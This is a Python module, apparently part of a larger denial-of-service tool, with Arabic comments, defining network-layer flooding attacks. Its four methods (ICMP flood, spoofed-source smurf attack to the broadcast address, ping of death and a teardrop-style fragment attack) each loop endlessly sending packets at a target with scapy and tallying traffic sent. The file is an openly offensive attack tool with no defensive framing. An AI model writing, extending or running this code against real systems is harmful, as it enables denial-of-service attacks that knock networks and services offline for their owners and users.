#!/usr/bin/env python3
"""
هجمات Layer 3 - طبقة الشبكة
"""

import socket
import struct
import random
import threading
import time
from scapy.all import IP, ICMP, send

class Layer3Attacks:
    def __init__(self, killer):
        self.killer = killer
        
    def icmp_flood(self, target):
        """ICMP Flood - إغراق باكتات ICMP"""
        while self.killer.running:
            try:
                for _ in range(10000):
                    packet = IP(dst=target)/ICMP()/self.killer.payload_gen.generate(65535)
                    send(packet, verbose=0)
                    
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
                    self.killer.stats['bytes'] += 65535 * 10000
            except:
                pass
    
    def smurf_attack(self, target):
        """Smurf Attack - استغلال البث"""
        while self.killer.running:
            try:
                broadcast = "255.255.255.255"
                packet = IP(src=target, dst=broadcast)/ICMP()/self.killer.payload_gen.generate(1024)
                send(packet, verbose=0)
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 1
            except:
                pass
    
    def ping_of_death(self, target):
        """Ping of Death - باكتات ضخمة"""
        while self.killer.running:
            try:
                packet = IP(dst=target)/ICMP()/self.killer.payload_gen.generate(65535)
                send(packet, verbose=0)
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 1
                    self.killer.stats['bytes'] += 65535
            except:
                pass
    
    def teardrop(self, target):
        """Teardrop Attack - تجزئة باكتات"""
        while self.killer.running:
            try:
                packet = IP(dst=target, flags=1, frag=0)/ICMP()/self.killer.payload_gen.generate(1024)
                send(packet, verbose=0)
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 1
            except:
                pass
